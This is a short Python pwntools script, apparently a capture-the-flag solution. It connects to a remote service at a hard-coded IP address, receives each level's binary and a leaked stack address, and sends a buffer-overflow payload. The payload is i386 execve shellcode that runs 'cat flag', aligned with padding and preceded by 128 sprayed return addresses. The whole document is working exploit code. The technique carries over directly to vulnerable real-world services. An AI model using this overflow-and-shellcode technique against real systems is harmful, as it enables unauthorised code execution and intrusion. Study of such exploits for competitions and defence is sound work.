from pwn import *

conn = remote('54.218.14.40', 9093)

def get_binary():
    # Load binary
    magic = '\x7fELF'
    print 'Finding binary...'
    conn.recvuntil(magic)
    data = ''
    data += magic
    data += conn.recvuntil('I am running')
    binary = data[:-len('I am running')]

    # Find address
    print 'Finding address...'
    junk = conn.recvuntil('taking input at:')
    assert len(junk) < 64
    addr = int(conn.recvuntil('\n'), 16)
    print 'Addr:', hex(addr)
    return binary, addr


"""
conn = process('./level1')

gdb.attach(conn, '''
    set follow-fork-mode child
''')

conn.recvuntil('taking input at:')
addr = int(conn.recvuntil('\n'), 16)
"""

n = 1
while 1:
    print 'Waiting for binary, nr %d...' % n
    binary, addr = get_binary()

    # Make exp

    shell = shellcraft.i386.execve(
        path = '/bin/cat', 
        argv = ['cat', 'flag'],
        envp = [])

    print shell

    shell = asm(shell)

    assert '\x90' not in shell

    reps = 128

    print addr % 4

    pay = 'A' * (4 - addr % 4)

    l_shell = addr + len(pay) + 4 * reps
    print 'Shell at:', hex(l_shell)

    pay += p32(l_shell) * reps
    pay += shell

    print 'Pwn:', pay.encode('hex')

    conn.sendline(pay)
    print 'Send'
    n += 1

